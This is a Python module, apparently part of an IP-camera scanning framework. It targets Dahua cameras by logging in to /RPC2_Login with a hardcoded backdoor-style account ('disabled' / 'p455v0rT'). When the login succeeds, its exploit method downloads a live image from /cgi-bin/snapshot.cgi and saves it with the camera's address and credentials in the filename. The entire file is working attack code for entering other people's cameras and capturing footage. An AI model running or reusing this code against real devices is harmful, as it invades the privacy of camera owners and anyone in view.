import requests
from requests.auth import HTTPDigestAuth

from loguru import logger

from .base import POCTemplate

_DAHUA_HEADERS = {
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
}


class DahuaDisabled(POCTemplate):
    product_key = 'dahua'

    def verify(self, ip, port=80):
        headers = {**self.headers,
                   'Host': ip, 'Origin': f'http://{ip}', 'Referer': f'http://{ip}',
                   **_DAHUA_HEADERS}
        _json = {
            "method": "global.login",
            "params": {"userName": "disabled", "password": "p455v0rT",
                       "clientType": "Web3.0", "loginType": "Direct",
                       "authorityType": "Default", "passwordType": "Plain"},
            "id": 1, "session": 0,
        }
        try:
            r = requests.post(f"http://{ip}:{port}/RPC2_Login", headers=headers,
                              json=_json, verify=False, timeout=self.config.timeout)
            if r.status_code == 200 and r.json()['result'] is True:
                return ip, str(port), self.product, 'disabled', 'p455v0rT', self.name
        except Exception as e:
            logger.debug(e)
        return None

    def exploit(self, results):
        ip, port, _, user, password, _ = results
        return self._snapshot(f"http://{ip}:{port}/cgi-bin/snapshot.cgi",
                              f"{ip}-{port}-{user}-{password}.jpg",
                              auth=HTTPDigestAuth(user, password))
